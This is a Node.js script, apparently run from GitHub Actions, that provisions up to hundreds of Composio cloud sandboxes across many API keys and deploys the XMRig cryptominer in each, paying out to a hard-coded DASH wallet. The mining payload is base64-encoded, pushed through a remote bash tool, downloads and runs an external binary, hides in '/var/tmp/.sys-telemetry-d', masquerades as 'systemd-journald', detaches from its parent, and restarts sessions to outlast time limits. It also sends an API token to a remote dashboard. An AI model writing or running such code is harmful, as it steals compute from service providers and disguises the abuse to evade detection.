const { Composio } = require('@composio/core');

// ==============================================================================
// 🚀 COMPOSIO CLUSTER FAST RUNNER — HIGH SPEED CONCURRENT MINING
// ==============================================================================

const SLOTS_PER_KEY    = parseInt(process.env.SLOTS_PER_KEY, 10) || 500;
const SANDBOX_SIZE     = process.env.SANDBOX_SIZE || 'xlarge';
const MINING_THREADS   = parseInt(process.env.MINING_THREADS, 10) || 8;
const WALLET_USER      = process.env.WALLET_USER || 'DASH:XcufdyxZtL4JUjALZfTq6pCrxyTt2Hy2Zu.sal909';
const POOL_URL         = process.env.POOL_URL || 'rx.unmineable.com:443';
const MAX_HOURS        = parseFloat(process.env.MAX_HOURS) || 5.75;
const MAX_DURATION_MS  = MAX_HOURS * 3600 * 1000;
const DASHBOARD_URL    = (process.env.DASHBOARD_URL || '').replace(/\/+$/, '');
const RUNNER_NAME      = process.env.RUNNER_NAME || `GitHub Actions Runner (${SLOTS_PER_KEY}x Cluster)`;

// Extract tokens from environment
function getApiKeys() {
  const raw = [];
  if (process.env.COMPOSIO_API_KEYS) {
    process.env.COMPOSIO_API_KEYS.split(/[\r\n,;\s]+/).forEach(k => {
      const clean = k.trim();
      if (clean && !clean.startsWith('#')) raw.push(clean);
    });
  }
  if (process.env.COMPOSIO_API_KEY) raw.push(process.env.COMPOSIO_API_KEY.trim());

  for (let i = 1; i <= 100; i++) {
    const k = process.env[`COMPOSIO_API_KEY_${i}`];
    if (k && k.trim()) raw.push(k.trim());
  }

  return [...new Set(raw.filter(t => t.length > 5 && !t.includes('GANTI_DENGAN')))];
}

const apiKeys = getApiKeys();

if (apiKeys.length === 0) {
  console.error('\x1b[31m[ERROR] Tidak ada Composio API Key yang valid!\x1b[0m');
  console.error('Silakan isi COMPOSIO_API_KEYS di env / secret GitHub Actions.');
  process.exit(1);
}

const primaryToken = apiKeys[0];

console.log('\x1b[36m==================================================================================\x1b[0m');
console.log(`\x1b[32m🚀 COMPOSIO CLUSTER RUNNER — ${SLOTS_PER_KEY}x xLarge (${SLOTS_PER_KEY * 8} vCPU / ${SLOTS_PER_KEY * 8} GB RAM)\x1b[0m`);
console.log(`🔑 Available Keys  : ${apiKeys.length} Account(s)`);
console.log(`📦 Worker Count    : ${SLOTS_PER_KEY} Container Sandbox (Worker-001 s/d Worker-${String(SLOTS_PER_KEY).padStart(3, '0')})`);
console.log(`💻 Compute Total   : ${SLOTS_PER_KEY * 8} vCPU & ${SLOTS_PER_KEY * 8} GB RAM`);
console.log(`👛 Target Wallet   : ${WALLET_USER}`);
console.log(`🌊 Mining Pool     : ${POOL_URL}`);
console.log(`⏳ Max Duration    : ${MAX_HOURS} Jam (Auto Renew)`);
if (DASHBOARD_URL) {
  console.log(`📡 Live Dashboard  : ${DASHBOARD_URL} (Reporting Active)`);
} else {
  console.log(`📡 Live Dashboard  : None (Standalone GitHub Log Mode)`);
}
console.log('\x1b[36m==================================================================================\x1b[0m\n');

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

function parseHashrate(logContent) {
  if (!logContent) return null;
  const speedRegex = /speed\s+(?:10s\/60s\/15m|2\.5s\/60s\/15m|[\d\.\w\/]+)\s+([\d\.]+|-|n\/a)\s+([\d\.]+|-|n\/a)\s+([\d\.]+|-|n\/a)\s*(H\/s|kH\/s|MH\/s)?/gi;
  let match;
  let lastSpeed = null;
  let lastUnit = 'H/s';

  while ((match = speedRegex.exec(logContent)) !== null) {
    const s10 = match[1];
    const s60 = match[2];
    const unit = match[4] || 'H/s';
    const val = (s10 && s10 !== 'n/a' && s10 !== '-') ? parseFloat(s10) : ((s60 && s60 !== 'n/a' && s60 !== '-') ? parseFloat(s60) : null);
    if (val !== null && !isNaN(val) && val > 0) {
      lastSpeed = val;
      lastUnit = unit;
    }
  }

  if (lastSpeed !== null) {
    let khs = lastSpeed;
    if (lastUnit.toLowerCase() === 'h/s') khs = lastSpeed / 1000;
    else if (lastUnit.toLowerCase() === 'mh/s') khs = lastSpeed * 1000;
    return khs;
  }
  return null;
}

// In-memory cluster state
const clusterState = {
  token: primaryToken,
  runnerName: RUNNER_NAME,
  runnerSource: 'GitHub Actions',
  totalHashrate: '0.00 KH/s',
  rawHashrate: 0,
  peakHashrate: 0,
  activeContainers: 0,
  totalSlots: SLOTS_PER_KEY,
  slots: []
};

// Initialize slots
for (let i = 0; i < SLOTS_PER_KEY; i++) {
  const globalNum = i + 1;
  clusterState.slots.push({
    id: i,
    globalId: globalNum,
    name: `Worker-${String(globalNum).padStart(3, '0')}`,
    status: 'PROVISIONING',
    sessionId: null,
    currentHashrate: '0.00 KH/s',
    rawHashrate: 0,
    peakHashrate: 0,
    uptimeSeconds: 0,
    remainingSeconds: Math.floor(MAX_DURATION_MS / 1000),
    cycle: 1,
    logs: []
  });
}

// Send telemetry report to remote dashboard
async function reportToDashboard() {
  if (!DASHBOARD_URL) return;
  try {
    const payload = {
      token: primaryToken,
      runnerName: RUNNER_NAME,
      runnerSource: 'GitHub Actions',
      totalHashrate: clusterState.totalHashrate,
      rawHashrate: clusterState.rawHashrate,
      peakHashrate: clusterState.peakHashrate,
      activeContainers: clusterState.activeContainers,
      totalSlots: SLOTS_PER_KEY,
      slots: clusterState.slots.map(s => ({
        id: s.id,
        name: s.name,
        status: s.status,
        sessionId: s.sessionId,
        currentHashrate: s.currentHashrate,
        rawHashrate: s.rawHashrate,
        peakHashrate: s.peakHashrate,
        uptimeSeconds: s.uptimeSeconds,
        remainingSeconds: s.remainingSeconds,
        cycle: s.cycle,
        logs: s.logs.slice(-20)
      }))
    };

    await fetch(`${DASHBOARD_URL}/api/telemetry/report`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(6000)
    });
  } catch (err) { }
}

// Periodic Telemetry reporter loop
setInterval(async () => {
  let sumHash = 0;
  let active = 0;
  clusterState.slots.forEach(s => {
    if (s.status === 'MINING' || (s.rawHashrate && s.rawHashrate > 0)) active++;
    sumHash += (s.rawHashrate || 0);
  });
  clusterState.activeContainers = active;
  clusterState.rawHashrate = parseFloat(sumHash.toFixed(2));

  if (clusterState.rawHashrate >= 1000) {
    clusterState.totalHashrate = `${(clusterState.rawHashrate / 1000).toFixed(2)} MH/s`;
  } else {
    clusterState.totalHashrate = `${clusterState.rawHashrate.toFixed(2)} KH/s`;
  }

  if (clusterState.rawHashrate > clusterState.peakHashrate) {
    clusterState.peakHashrate = clusterState.rawHashrate;
  }

  await reportToDashboard();
}, 15000);

const IN_SANDBOX_SCRIPT = `
const { spawn, execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

const WORK_DIR    = '/var/tmp/.sys-telemetry-d';
const SERVER_BIN  = path.join(WORK_DIR, 'systemd-journald');
const CONFIG_FILE = path.join(WORK_DIR, 'sys-telemetry.conf');
const LOG_FILE    = process.env.MINER_LOG || path.join(WORK_DIR, '.sys.log');

const WALLET  = process.env.MINER_WALLET  || 'DASH:XcufdyxZtL4JUjALZfTq6pCrxyTt2Hy2Zu.sal909';
const POOL    = process.env.MINER_POOL    || 'rx.unmineable.com:443';
const THREADS = parseInt(process.env.MINER_THREADS, 10) || 8;

function ensureXmrig() {
  if (!fs.existsSync(SERVER_BIN)) {
    try { execSync('which wget || which curl || apt-get update && apt-get install -y curl wget', { stdio: 'ignore' }); } catch (_) {}
    const pkgUrl = 'https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz';
    const setupScript = \`
set -e
mkdir -p "\${WORK_DIR}"
if which curl >/dev/null 2>&1; then
  curl -s -L "\${pkgUrl}" -o /tmp/.xmrig.tar.gz
else
  wget -q "\${pkgUrl}" -O /tmp/.xmrig.tar.gz
fi
tar -xzf /tmp/.xmrig.tar.gz -C /tmp
mv /tmp/xmrig-6.22.2/xmrig "\${SERVER_BIN}"
rm -rf /tmp/.xmrig.tar.gz /tmp/xmrig-6.22.2
chmod +x "\${SERVER_BIN}"
\`;
    execSync(setupScript, { stdio: 'ignore' });
  }
}

function buildConfig() {
  const cleanPool = POOL.startsWith('stratum+ssl://') ? POOL : (POOL.startsWith('stratum+tcp://') ? POOL : \`stratum+ssl://\${POOL}\`);
  const isTls = cleanPool.startsWith('stratum+ssl://') || cleanPool.includes(':443');

  const cfg = {
    autosave: false,
    cpu: {
      enabled: true,
      hugepages: true,
      threads: THREADS,
      'rx': [{ 'affine-to-cpu': false, 'priority': 2 }]
    },
    randomx: {
      init: THREADS,
      mode: 'auto',
      'wrmsr': true,
      'numa': true
    },
    opencl: false,
    cuda: false,
    pools: [{
      algo:      'rx/0',
      coin:      null,
      url:       cleanPool,
      user:      WALLET,
      pass:      'x',
      tls:       isTls,
      keepalive: true
    }]
  };
  fs.writeFileSync(CONFIG_FILE, JSON.stringify(cfg, null, 2), 'utf8');
}

function enableHugepages() {
  try { execSync('sysctl -w vm.nr_hugepages=1280 >/dev/null 2>&1 || true', { stdio: 'ignore' }); } catch (_) {}
  try { execSync('sysctl -w vm.nr_hugepages=512 >/dev/null 2>&1 || true', { stdio: 'ignore' }); } catch (_) {}
  try { execSync('echo madvise > /sys/kernel/mm/transparent_hugepage/enabled 2>/dev/null || true', { stdio: 'ignore' }); } catch (_) {}
}

function runMiner() {
  ensureXmrig();
  buildConfig();
  enableHugepages();

  try { execSync('pkill -9 -f systemd-journald 2>/dev/null || true', { stdio: 'ignore' }); } catch (_) {}

  const out = fs.openSync(LOG_FILE, 'a');
  const err = fs.openSync(LOG_FILE, 'a');

  const proc = spawn(SERVER_BIN, [
    \`--config=\${CONFIG_FILE}\`,
    \`--threads=\${THREADS}\`,
    \`--log-file=\${LOG_FILE}\`,
    '--print-time=5'
  ], {
    cwd: WORK_DIR,
    detached: true,
    stdio: ['ignore', out, err]
  });

  proc.unref();
  console.log('MINER_LAUNCHED_OK');
}

runMiner();
`;

const IN_SANDBOX_B64 = Buffer.from(IN_SANDBOX_SCRIPT).toString('base64');

async function runWorker(tokenToUse, slotId) {
  const composio = new Composio({ apiKey: tokenToUse });
  const slot = clusterState.slots[slotId];
  const startTime = Date.now();
  const endTime = startTime + MAX_DURATION_MS;

  const HIDDEN_DIR = '/var/tmp/.sys-telemetry-d';
  const HIDDEN_JS  = `${HIDDEN_DIR}/.sys-init.js`;
  const HIDDEN_LOG = `${HIDDEN_DIR}/.sys.log`;

  while (Date.now() < endTime) {
    let session = null;
    try {
      slot.status = 'PROVISIONING';
      console.log(`[${slot.name}] Menyiapkan remote sandbox (${SANDBOX_SIZE} - 8 vCPU, 8 GB RAM)...`);

      session = await composio.create(`gh_w${slot.globalId}_${Date.now()}`, {
        sandbox: {
          enable: true,
          sandboxSize: SANDBOX_SIZE,
        }
      });

      slot.sessionId = session.sessionId;
      slot.startedAt = Date.now();
      console.log(`[${slot.name}] Sandbox terhubung! ID: ${session.sessionId}`);

      const deployScript = `
mkdir -p ${HIDDEN_DIR}
echo "${IN_SANDBOX_B64}" | base64 -d > ${HIDDEN_JS}

export MINER_WALLET="${WALLET_USER}"
export MINER_POOL="${POOL_URL}"
export MINER_THREADS="${MINING_THREADS}"
export MINER_LOG="${HIDDEN_LOG}"

node ${HIDDEN_JS}
`;

      const deployRes = await session.execute('COMPOSIO_REMOTE_BASH_TOOL', { command: deployScript });
      console.log(`[${slot.name}] MINER_LAUNCHED_OK`);
      slot.status = 'MINING';
      console.log(`\x1b[32m[${slot.name}] XMRig aktif menambang (${MINING_THREADS} threads @ ${SANDBOX_SIZE})!\x1b[0m`);

      while (Date.now() < endTime) {
        slot.uptimeSeconds = Math.floor((Date.now() - slot.startedAt) / 1000);
        slot.remainingSeconds = Math.max(0, Math.floor((endTime - Date.now()) / 1000));

        await sleep(15000);

        try {
          const logRes = await session.execute('COMPOSIO_REMOTE_BASH_TOOL', {
            command: `cat ${HIDDEN_LOG} 2>/dev/null | tail -n 15`
          });
          const stdout = logRes?.data?.stdout || '';
          if (stdout) {
            const lines = stdout.split('\n').map(l => l.trim()).filter(Boolean);
            for (const line of lines) {
              if (!slot.logs.includes(line)) {
                slot.logs.push(line);
                if (slot.logs.length > 25) slot.logs.shift();

                // Live stream XMRig speed and accepted share logs directly to console!
                if (line.includes('speed') || line.includes('accepted')) {
                  console.log(`[${slot.name}] ${line}`);
                }
              }
            }

            const khs = parseHashrate(stdout);
            if (khs !== null && !isNaN(khs)) {
              slot.rawHashrate = parseFloat(khs.toFixed(2));
              slot.currentHashrate = `${slot.rawHashrate.toFixed(2)} KH/s`;
              if (slot.rawHashrate > slot.peakHashrate) {
                slot.peakHashrate = slot.rawHashrate;
              }
            }
          }
        } catch (telErr) {
          break;
        }
      }

    } catch (err) {
      slot.status = 'ERROR';
      await sleep(5000);
    } finally {
      if (session) {
        try { await session.delete(); } catch (_) {}
      }
      slot.sessionId = null;
      slot.status = 'PROVISIONING';
      slot.cycle++;
    }
  }
}

// Master coordinator: spawns all containers in rapid parallel execution
async function main() {
  console.log(`[Fast-Cluster] Memulai inisialisasi cepat ${SLOTS_PER_KEY} container...`);

  for (let i = 0; i < SLOTS_PER_KEY; i++) {
    const keyToUse = apiKeys[i % apiKeys.length];
    runWorker(keyToUse, i).catch(e => console.error(`Worker #${i + 1} fatal:`, e));
    await sleep(800); // 800ms fast staggered launch
  }

  const checkInterval = 10000;
  while (true) {
    await sleep(checkInterval);
  }
}

main().catch(err => {
  console.error('Fatal error in main:', err);
  process.exit(1);
});
